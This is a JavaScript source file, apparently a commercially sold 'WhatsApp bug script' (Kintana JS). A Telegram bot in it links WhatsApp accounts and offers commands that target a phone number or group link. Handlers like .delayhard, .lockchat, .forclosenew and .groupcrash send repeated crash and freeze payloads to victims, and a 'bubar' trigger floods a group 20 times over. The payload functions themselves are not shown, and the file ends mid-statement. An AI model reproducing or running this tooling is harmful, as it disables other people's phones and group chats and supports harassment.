const chalk = require("chalk");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const axios = require('axios');
const fs = require("fs");
const readline = require('readline');
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const FormData = require('form-data');
const bot = new TelegramBot(config.BOT_TOKEN, { polling: true });

const RICH_CSS = `<style>
  table { width: 100%; border-collapse: collapse; margin: 10px 0; }
  th, td { text-align: center !important; padding: 8px; border: 1px solid #555; }
  th { background-color: #2b2b2b; color: #fff; font-weight: bold; }
</style>`;

async function sendRichMenu(chatId, html, replyToMessageId = null) {
  const token = bot.token;
  const payload = {
    chat_id: chatId,
    rich_message: { html: RICH_CSS + html }
  };
  if (replyToMessageId) payload.reply_parameters = { message_id: replyToMessageId };
  try {
    await axios.post(`https://api.telegram.org/bot${token}/sendRichMessage`, payload);
  } catch (e) {
    console.error("sendRichMenu error:", e?.response?.data || e.message);
  }
}

async function editRichMenu(chatId, messageId, html) {
  const token = bot.token;
  try {
    await axios.post(`https://api.telegram.org/bot${token}/editMessageText`, {
      chat_id: chatId,
      message_id: messageId,
      rich_message: { html: RICH_CSS + html }
    });
  } catch (e) {
    try { await bot.deleteMessage(chatId, messageId); } catch (_) {}
    await sendRichMenu(chatId, html);
  }
}

function lower(text) {
  return String(text || "").toLowerCase();
}

const BLOCKCMD_PATH = "./lib/database/blockcmd.json";
const BLOCKED_CMD_PATH = "./lib/database/blocked_commands.json";

let blockCmdEnabled = false;
let blockedCommands = []; 

try {
  if (fs.existsSync(BLOCKCMD_PATH)) {
    const _bc = JSON.parse(fs.readFileSync(BLOCKCMD_PATH));
    blockCmdEnabled = !!_bc.enabled;
  }
} catch (e) { console.error("blockcmd load:", e); }

try {
  if (fs.existsSync(BLOCKED_CMD_PATH)) {
    const _bl = JSON.parse(fs.readFileSync(BLOCKED_CMD_PATH));
    if (Array.isArray(_bl.blocked)) blockedCommands = _bl.blocked;
  }
} catch (e) { console.error("blocked_commands load:", e); }

function saveBlockCmd() {
  try {
    if (!fs.existsSync("./lib/database")) fs.mkdirSync("./lib/database", { recursive: true });
    fs.writeFileSync(BLOCKCMD_PATH, JSON.stringify({ enabled: blockCmdEnabled }, null, 2));
  } catch (e) { console.error("blockcmd save:", e); }
}

function saveBlockedCommands() {
  try {
    if (!fs.existsSync("./lib/database")) fs.mkdirSync("./lib/database", { recursive: true });
    fs.writeFileSync(BLOCKED_CMD_PATH, JSON.stringify({ blocked: blockedCommands }, null, 2));
  } catch (e) { console.error("blocked_commands save:", e); }
}

function extractCommand(text) {
  if (!text) return null;
  const trimmed = String(text).trim();
  if (!trimmed.startsWith("/")) return null;
  const firstToken = trimmed.split(/\s+/)[0];
  const cmd = firstToken.split("@")[0].toLowerCase();
  if (!/^\/[a-zA-Z0-9_]+$/.test(cmd)) return null;
  return cmd;
}

const PROTECTED_COMMANDS = [
  "/blockcmd", "/block", "/unblock", "/listblock"
];

function isCommandBlocked(text) {
  const cmd = extractCommand(text);
  if (!cmd) return false;
  if (PROTECTED_COMMANDS.includes(cmd)) return false;
  return blockedCommands.includes(cmd);
}

const _origOnText = bot.onText.bind(bot);
bot.onText = function (regex, callback) {
  return _origOnText(regex, (msg, match) => {
    try {
      const fromId = msg.from?.id?.toString() || "";
      const chatId = String(msg.chat?.id || "");
      const text = msg.text || "";

      const re = new RegExp(regex.source, regex.flags.replace("g", ""));
      const localMatch = text.match(re);
      if (!localMatch) return;

      const isOwnerUser = isOwner(fromId);
      const isAdminUser = adminUsers.map(String).includes(fromId);
      const isPremiumUser = premiumUsers.map(String).includes(fromId);
      const isMurbugGroup = murbugGC.includes(chatId);

      const bypassBlockedCommand = isOwnerUser;
      const bypassBlockCmd = isOwnerUser ||
        (blockCmdEnabled && (isAdminUser || isPremiumUser || isMurbugGroup));

      const isBlockCmdCtrl = /^\/(blockcmd|block|unblock|listblock)\b/i.test(text);
      if (blockCmdEnabled && !bypassBlockCmd && !isBlockCmdCtrl) {
        const html = `<h3>access denied</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>locked by owner</td></tr>
<tr><td>action</td><td>purchase the script to gain access</td></tr>
<tr><td>contact</td><td>@heysaka</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaoffcbot" style="primary">buy script</tg-button>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`;
        sendRichMenu(msg.chat.id, html, msg.message_id);
        return;
      }

      const invokedCmd = extractCommand(text);
      if (!bypassBlockedCommand && invokedCmd && blockedCommands.includes(invokedCmd)) {
        const html = `<h3>command blocked</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>${invokedCmd}</td></tr>
<tr><td>status</td><td>this command is currently unavailable</td></tr>
<tr><td>contact</td><td>@heysaka</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaoffcbot" style="primary">buy script</tg-button>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`;
        sendRichMenu(msg.chat.id, html, msg.message_id);
        return;
      }

      return callback(msg, localMatch);
    } catch (e) {
      console.error("middleware error:", e);
      return;
    }
  });
};

let premiumUsers = JSON.parse(fs.readFileSync('./lib/database/prem.json'));
let adminUsers = JSON.parse(fs.readFileSync('./lib/database/admin.json'));

function getGreeting() {
    const hours = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta", hour: "numeric", hour12: false });
    const hour = parseInt(hours, 10);
    if (hour >= 3 && hour < 11) return "good morning";
    if (hour >= 11 && hour < 15) return "good afternoon";
    if (hour >= 15 && hour < 18) return "good evening";
    return "good night";
}

function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`file ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`error updating ${filePath}:`, error.message);
            }
        }
    });
};
watchFile('./lib/database/prem.json', (data) => (premiumUsers = data));
watchFile('./lib/database/admin.json', (data) => (adminUsers = data));

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

let murbugGC = []
if (fs.existsSync("./lib/database/StudentBugGroup.json")) {
  murbugGC = JSON.parse(fs.readFileSync("./lib/database/StudentBugGroup.json"))
}

function saveMurbugGC() {
  try {
    if (!fs.existsSync("./lib/database")) fs.mkdirSync("./lib/database", { recursive: true });
    fs.writeFileSync("./lib/database/StudentBugGroup.json", JSON.stringify(murbugGC, null, 2));
  } catch (e) { console.error("saveMurbugGC:", e); }
}

function savePremiumUsers() {
    fs.writeFileSync('./lib/database/prem.json', JSON.stringify(premiumUsers, null, 2));
};
function saveAdminUsers() {
    fs.writeFileSync('./lib/database/admin.json', JSON.stringify(adminUsers, null, 2));
};
const RECONNECT_INTERVAL = 60000;

async function restricted(chatid) {
    const html = `<h3>restricted</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>access denied</td></tr>
<tr><td>reason</td><td>this feature is restricted for you</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`;
    await sendRichMenu(chatid, html);
}

const DEVELOPER = "1189546122";
const sessions = new Map();
const waSessions = new Map();
const botwaNumbers = new Set();
const SESSIONS_DIR = "./lib/sessions";
const SESSIONS_FILE = "./lib/sessions/active_sessions.json";

function saveActiveSessions(botNumber, type = "public", ownerId = null) {
  try {
    let sessionsData = {};
    if (fs.existsSync(SESSIONS_FILE)) {
      sessionsData = JSON.parse(fs.readFileSync(SESSIONS_FILE));
    }
    sessionsData[botNumber] = { type, ownerId };
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsData, null, 2));
  } catch (error) {
    console.error("error saving session:", error);
  }
}

function removeActiveSession(botNumber) {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const sessionsData = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      delete sessionsData[botNumber];
      fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsData, null, 2));
    }
  } catch (error) {
    console.error("error removing session:", error);
  }
}

bot.on("message", (msg) => {
  try {
    const text = msg.text || msg.caption || "";
    if (!text) return;

    const pushname = msg.from?.first_name
      ? `${msg.from.first_name}${msg.from.last_name ? " " + msg.from.last_name : ""}`
      : (msg.from?.username || "User");
    const senderNumber = msg.from?.id || "-";

    console.log('\x1b[30m--------------------\x1b[0m');
    console.log(chalk.bgHex("#4a69bd").bold(`New Message`));
    console.log(
      chalk.bgHex("#ffffff").black(
        `   Tanggal: ${new Date().toLocaleString()} \n` +
        `   Pesan: ${text} \n` +
        `   Pengirim: ${pushname} \n` +
        `   JID: ${senderNumber} \n`
      )
    );
    console.log();
  } catch (e) {
    console.error("tg log error:", e?.message);
  }
});

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeSessions = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      const entries = Object.entries(activeSessions);
      console.log(`-----------------\nfound ${entries.length} active whatsapp sessions\n-----------------`);

      for (const [botNumber, data] of entries) {
        const type = typeof data === "string" ? data : (data.type || "public");
        if (type === "wa") {
          console.log(`[init] skip ${botNumber} (botwa)`);
          continue;
        }
        let ownerId = null;
        if (typeof data === "object") ownerId = data.ownerId || null;
        await connectWithRetry(botNumber, type, 1, 3, ownerId);
      }
    }
  } catch (error) {
    console.error("error initializing whatsapp connections:", error);
  }
}

async function connectWithRetry(botNumber, type = "public", attempt = 1, maxAttempts = 3, ownerId = null) {
  const sessionDir = createSessionDir(botNumber);

  try {
    console.log(`-----------------\nattempting to connect whatsapp: ${botNumber} (${type.toUpperCase()}) (attempt ${attempt}/${maxAttempts})\n-----------------`);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: true,
      logger: P({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    const isConnected = await new Promise((resolve) => {
      const timeout = setTimeout(() => {
        sock.ev.off('connection.update', connectionHandler);
        resolve(false);
      }, 10000);

      const connectionHandler = (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "open") {
          clearTimeout(timeout);
          console.log(`-----------------------\nbot ${botNumber} (${type}) connected!\n-----------------------`);
          sessions.set(botNumber, { sock, type, ownerId });
          sock.ev.on("creds.update", saveCreds);
          resolve(true);
        } else if (connection === "close") {
          clearTimeout(timeout);
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          if (!shouldReconnect) {
            sessions.delete(botNumber);
            removeActiveSession(botNumber);
            console.log(`bot ${botNumber} logged out permanently, session deleted.`);
          }
          resolve(shouldReconnect ? false : 'loggedOut');
        }
      };

      sock.ev.on('connection.update', connectionHandler);
    });

    if (isConnected === true) {
      return;
    } else if (isConnected === 'loggedOut') {
      throw new Error('logged out');
    }

    if (attempt < maxAttempts) {
      await new Promise(resolve => setTimeout(resolve, 2000));
      return connectWithRetry(botNumber, type, attempt + 1, maxAttempts, ownerId);
    } else {
      throw new Error('failed after 3 attempts');
    }

  } catch (error) {
    console.error(`-----------------\nerror connecting bot ${botNumber}:`, error.message);

    if (attempt >= maxAttempts || error.message === 'logged out') {
      console.log(`-----------------\ndeleting session for bot ${botNumber}...\n`);
      removeActiveSession(botNumber);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }
      console.log(`-----------------\nsession for bot ${botNumber} has been deleted\n-----------------`);
    }
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId, type = "public", ownerId = null) {
  if (botwaNumbers.has(botNumber)) {
    console.log(`[connectToWhatsApp] skip ${botNumber} (botwa)`);
    return;
  }
  const token = bot.token;
  let statusMessageId = null;

  try {
    const initHtml = `<h3>whatsapp connection</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>bot</td><td>${botNumber}</td></tr>
<tr><td>type</td><td>${type.toUpperCase()}</td></tr>
<tr><td>status</td><td>initializing...</td></tr>
</table>`;
    const res = await axios.post(`https://api.telegram.org/bot${token}/sendRichMessage`, {
      chat_id: chatId,
      rich_message: { html: RICH_CSS + initHtml }
    });
    statusMessageId = res?.data?.result?.message_id;
  } catch (e) {
    console.error("failed to send init message:", e?.message);
  }

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  const updateStatus = async (title, rows) => {
    if (!statusMessageId) return;
    let rowsHtml = "";
    for (const [k, v] of rows) {
      rowsHtml += `<tr><td>${k}</td><td>${v}</td></tr>\n`;
    }
    const html = `<h3>${title}</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
${rowsHtml}
</table>`;
    try {
      await axios.post(`https://api.telegram.org/bot${token}/editMessageText`, {
        chat_id: chatId,
        message_id: statusMessageId,
        rich_message: { html: RICH_CSS + html }
      });
    } catch (e) {
      console.error("failed to edit status:", e?.message);
    }
  };

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await updateStatus("whatsapp connection", [
          ["bot", botNumber],
          ["type", type.toUpperCase()],
          ["status", "reconnecting..."]
        ]);
        await connectToWhatsApp(botNumber, chatId, type, ownerId);
      } else {
        sessions.delete(botNumber);
        removeActiveSession(botNumber);
        await updateStatus("whatsapp connection", [
          ["bot", botNumber],
          ["type", type.toUpperCase()],
          ["status", "connection failed"]
        ]);
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, { sock, type, ownerId });
      saveActiveSessions(botNumber, type, ownerId);

      await updateStatus("whatsapp connection", [
        ["bot", botNumber],
        ["type", type.toUpperCase()],
        ["status", "successfully connected"]
      ]);
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        let customcode = "SAKA4444";
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, customcode);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await updateStatus("whatsapp pairing", [
            ["bot", botNumber],
            ["type", type.toUpperCase()],
            ["pairing code", `<b>${formattedCode}</b>`],
            ["status", "enter code in whatsapp"]
          ]);
        }
      } catch (error) {
        console.error("error requesting pairing code:", error);
        await updateStatus("whatsapp connection", [
          ["bot", botNumber],
          ["type", type.toUpperCase()],
          ["status", "error"],
          ["message", error.message]
        ]);
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

const WA_PAIRING_CODE = "SAKA4444";
const MAX_WA_BOTS = 10;

function canAddMoreWABots() {
  const activeCount = Array.from(waSessions.values()).filter(d => d.type === "wa" || d.sock).length;
  return activeCount < MAX_WA_BOTS;
}

async function sendWAMenu(sock, from, mek, sender) {
  const pushname = mek.pushName || "User";
  const uptime = process.uptime();
  const uptimeStr = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m`;
  const greeting = getGreeting();

  const expiredDate = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000);
  const expiredStr = expiredDate.toLocaleDateString("id-ID", {
    day: "2-digit", month: "short", year: "numeric"
  });

  const bodyText = `\`「 KINTANA JS 」\`
 ${greeting}, *${pushname}*
  Bot: Kintana JavaScript
  Versi: 10.1.0
  Uptime: ${uptimeStr}
  Platform: WhatsApp

\`「 MENU UTAMA 」\`
.menu    - menu ini
.ping    - cek respon
.owner   - kontak owner
.status  - status bot

\`「 ANDROID BUG 」\`
.delayhard 62xxx
.lockchat 62xxx
.forclosenew 62xxx
.blankclick 62xxx
.frezehard 62xxx

\`「 GROUP BUG 」\`
.groupcrash (link)
.bubar (bug in place)

Ketik dengan awalan titik (.)

- Kintana JavaScript
Berakhir pada ${expiredStr}`;

  try {
    const imagePayload = await prepareWAMessageMedia({
      image: { url: "https://files.catbox.moe/f0sy28.jpg" }
    }, { upload: sock.waUploadToServer, mediaType: "image" });

    const msg = generateWAMessageFromContent(from, proto.Message.fromObject({
      interactiveMessage: {
        header: {
          title: "> Credit By H3ysaka",
          subtitle: "WhatsApp Bug Script",
          hasMediaAttachment: true,
          ...imagePayload
        },
        body: { text: bodyText },
        footer: { text: `Berakhir pada ${expiredStr}` },
        nativeFlowMessage: {
          buttons: [
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "Channel Telegram",
                url: "https://t.me/kintanaofficial",
                merchant_url: "https://t.me/kintanaofficial"
              })
            },
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "Creator",
                url: "https://t.me/heysaka",
                merchant_url: "https://t.me/heysaka"
              })
            },
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "Buy Script",
                url: "https://t.me/kintanaoffcbot",
                merchant_url: "https://t.me/kintanaoffcbot"
              })
            }
          ]
        }
      }
    }), { quoted: mek });

    await sock.relayMessage(from, msg.message, { messageId: msg.key.id });

  } catch (err) {
    console.error("[botwa] interactive menu error, fallback:", err?.message);

    try {
      await sock.sendMessage(from, {
        text: bodyText,
        contextInfo: {
          mentionedJid: [sender],
          externalAdReply: {
            title: "Kintana JavaScript",
            body: "WhatsApp Bug Script by Heysaka",
            thumbnailUrl: "https://files.catbox.moe/f0sy28.jpg",
            sourceUrl: "https://t.me/kintanaofficial",
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: false
          }
        }
      }, { quoted: mek });
    } catch (err2) {
      console.error("[botwa] fallback error:", err2?.message);
    }
  }
}

async function handleWAMessage(sock, number, chatUpdate) {
  try {
    const mek = chatUpdate.messages[0];
    if (!mek.message) return;
    if (chatUpdate.type !== "notify") return;

    mek.message = Object.keys(mek.message)[0] === "ephemeralMessage"
      ? mek.message.ephemeralMessage.message
      : mek.message;

    const from = mek.key.remoteJid;
    const sender = mek.key.fromMe
      ? sock.user.id.split(":")[0] + "@s.whatsapp.net"
      : (mek.key.participant || mek.key.remoteJid);

    const type = getContentType(mek.message);
    const body = (type === "conversation" && mek.message.conversation)
      || (type === "extendedTextMessage" && mek.message.extendedTextMessage.text)
      || (type === "imageMessage" && mek.message.imageMessage.caption)
      || (type === "videoMessage" && mek.message.videoMessage.caption)
      || "";

    const pushname = mek.pushName || "User";
    const senderNumber = sender.split("@")[0];

    if (mek.message) {
      console.log('\x1b[30m--------------------\x1b[0m');
      console.log(chalk.bgHex("#4a69bd").bold(`New Message`));
      console.log(
        chalk.bgHex("#ffffff").black(
          `   Tanggal: ${new Date().toLocaleString()} \n` +
          `   Pesan: ${body || type} \n` +
          `   Pengirim: ${pushname} \n` +
          `   JID: ${senderNumber} \n`
        )
      );
      console.log();
    }

if (body.trim().toLowerCase() === "bubar") {
  try {
    await sock.sendMessage(from, {
      react: { text: "☀", key: mek.key }
    });

    const groupMetadata = await sock.groupMetadata(from);
    const groupJid = groupMetadata.id;

    for (let i = 0; i < 20; i++) {
      await Promise.allSettled([
        halonyetGB(sock, groupJid).catch(() => {}),
        halonyetGB(sock, groupJid).catch(() => {}),
        halonyetGB(sock, groupJid).catch(() => {})
      ]);
      await sleep(500);
    }
  } catch (e) {}
  return;
}

    if (!body.startsWith(".")) return;

    const command = body.slice(1).trim().split(/\s+/)[0].toLowerCase();
    const args = body.trim().split(/\s+/).slice(1);

    console.log(`[wa-cmd] ${sender.split("@")[0]} -> .${command} (bot ${number})`);

    switch (command) {
      case "menu": {
        await sendWAMenu(sock, from, mek, sender);
        break;
      }

      case "ping": {
        const t0 = Date.now();
        await sock.sendMessage(from, {
          text: `Pong!\n\nRespon: ${Date.now() - t0}ms\nStatus: Online\nBot: ${number}`
        }, { quoted: mek });
        break;
      }

      case "owner": {
        await sock.sendMessage(from, {
          text: `Owner Bot\n\nTelegram: @heysaka\nChannel: t.me/kintanaofficial\nScript: Kintana JavaScript v10.1.0`
        }, { quoted: mek });
        break;
      }

      case "status": {
        const uptime = process.uptime();
        const mem = process.memoryUsage();
        const memMB = (mem.rss / 1024 / 1024).toFixed(2);
        await sock.sendMessage(from, {
          text: `Bot Status\n\nUptime: ${Math.floor(uptime / 60)} menit\nMemory: ${memMB} MB\nBot: ${number}\nVersion: 10.1.0`
        }, { quoted: mek });
        break;
      }

      case "delayhard": {
        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .delayhard 628123456789" }, { quoted: mek });
        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
        await sock.sendMessage(from, { text: `Mengirim bug .delayhard ke ${args[0]}...` }, { quoted: mek });
        try {
          await bug1(sock, target);
          await bug1(sock, target);
          await sock.sendMessage(from, { text: `Bug .delayhard terkirim ke ${args[0]}` }, { quoted: mek });
        } catch (e) {
          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
        }
        break;
      }

      case "lockchat": {
        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .lockchat 628123456789" }, { quoted: mek });
        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
        await sock.sendMessage(from, { text: `Mengirim bug .lockchat ke ${args[0]}...` }, { quoted: mek });
        try {
          await bug2(sock, target);
          await bug2(sock, target);
          await sock.sendMessage(from, { text: `Bug .lockchat terkirim ke ${args[0]}` }, { quoted: mek });
        } catch (e) {
          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
        }
        break;
      }

      case "blankclick": {
        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .blankclick 628123456789" }, { quoted: mek });
        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
        await sock.sendMessage(from, { text: `Mengirim bug .blankclick ke ${args[0]}...` }, { quoted: mek });
        try {
          await bug3(sock, target);
          await bug3(sock, target);
          await sock.sendMessage(from, { text: `Bug .blankclick terkirim ke ${args[0]}` }, { quoted: mek });
        } catch (e) {
          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
        }
        break;
      }

      case "frezehard": {
        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .frezehard 628123456789" }, { quoted: mek });
        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
        await sock.sendMessage(from, { text: `Mengirim bug .frezehard ke ${args[0]}...` }, { quoted: mek });
        try {
          await bug4(sock, target);
          await bug4(sock, target);
          await sock.sendMessage(from, { text: `Bug .frezehard terkirim ke ${args[0]}` }, { quoted: mek });
        } catch (e) {
          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
        }
        break;
      }

      case "forclosenew": {
        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .forclosenew 628123456789" }, { quoted: mek });
        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
        await sock.sendMessage(from, { text: `Mengirim bug .lockchat ke ${args[0]}...` }, { quoted: mek });
        try {
          await bug5(sock, target);
          await bug5(sock, target);
          await sock.sendMessage(from, { text: `Bug .lockchat terkirim ke ${args[0]}` }, { quoted: mek });
        } catch (e) {
          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
        }
        break;
      }

      case "groupcrash": {
        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .groupcrash https://chat.whatsapp.com/xxxxx" }, { quoted: mek });
        const inviteCode = args[0].match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)?.[1];
        if (!inviteCode) return sock.sendMessage(from, { text: "Link grup tidak valid." }, { quoted: mek });
        try {
          const groupInfo = await sock.groupGetInviteInfo(inviteCode);
          const groupJid = groupInfo.id;
          await sock.sendMessage(from, { text: `Mengirim bug grup ke ${groupInfo.subject}...` }, { quoted: mek });
          for (let i = 0; i < 20; i++) {
            await Promise.allSettled([
              anjayGB(sock, groupJid).catch(() => {}),            
              kitow(sock, groupJid).catch(() => {}),
              kicaumania(sock, groupJid).catch(() => {}),
              GbCrash(sock, groupJid).catch(() => {}),
              halonyetGB(sock, groupJid).catch(() => {})
            ]);
            await sleep(500);
          }
          await sock.sendMessage(from, { text: `Bug grup terkirim.` }, { quoted: mek });
        } catch (e) {
          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
        }
        break;
      }
    } 
  } catch (e) {
    console.error("handleWAMessage error:", e);
  }
} 

bot.onText(/^\/botwa(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) return restricted(chatId);

  if (!canAddMoreWABots()) {
    return sendRichMenu(chatId,
      `<h3>limit reached</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>max bots</td><td>${MAX_WA_BOTS}</td></tr>
<tr><td>status</td><td>limit tercapai, hapus bot lain dulu</td></tr>
<tr><td>command</td><td>/delbotwa &lt;nomor&gt;</td></tr>
</table>`,
      msg.message_id
    );
  }

  if (!match[1]) {
    return sendRichMenu(chatId,
      `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/botwa</td></tr>
<tr><td>example</td><td>/botwa 628123456789</td></tr>
<tr><td>max bots</td><td>${MAX_WA_BOTS}</td></tr>
</table>`,
      msg.message_id
    );
  }

  let number = match[1].replace(/[^0-9]/g, "");

  if (number.length < 10 || number.length > 15) {
    return sendRichMenu(chatId,
      `<h3>invalid number</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>input</td><td>${number}</td></tr>
<tr><td>status</td><td>format nomor tidak valid</td></tr>
</table>`,
      msg.message_id
    );
  }

  if (waSessions.has(number)) {
    const s = waSessions.get(number);
    return sendRichMenu(chatId,
      `<h3>already connected</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>number</td><td>${number}</td></tr>
<tr><td>status</td><td>already connected</td></tr>
<tr><td>since</td><td>${new Date(s.connectedAt || Date.now()).toLocaleString()}</td></tr>
</table>`,
      msg.message_id
    );
  }

  const token = bot.token;
  let statusId = null;
  try {
    const res = await axios.post(`https://api.telegram.org/bot${token}/sendRichMessage`, {
      chat_id: chatId,
      rich_message: {
        html: RICH_CSS + `<h3>botwa connection</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>number</td><td>${number}</td></tr>
<tr><td>status</td><td>initializing...</td></tr>
</table>`
      }
    });
    statusId = res?.data?.result?.message_id;
  } catch (e) {
    console.error("botwa init status:", e?.message);
  }

  const updateStatus = async (title, rows) => {
    if (!statusId) return;
    let rowsHtml = "";
    for (const [k, v] of rows) rowsHtml += `<tr><td>${k}</td><td>${v}</td></tr>\n`;
    try {
      await axios.post(`https://api.telegram.org/bot${token}/editMessageText`, {
        chat_id: chatId,
        message_id: statusId,
        rich_message: {
          html: RICH_CSS + `<h3>${title}</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
${rowsHtml}
</table>`
        }
      });
    } catch (e) {
      console.error("botwa edit status:", e?.message);
    }
  };

  const sessionDir = path.join(SESSIONS_DIR, `wa_${number}`);
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  botwaNumbers.add(number);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
    browser: ["Ubuntu", "Chrome", "20.0.00"],
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "connecting") {
      await sleep(1500);
      try {
        if (!fs.existsSync(path.join(sessionDir, "creds.json"))) {
          const code = await sock.requestPairingCode(number, WA_PAIRING_CODE);
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;

          await updateStatus("botwa pairing", [
            ["number", number],
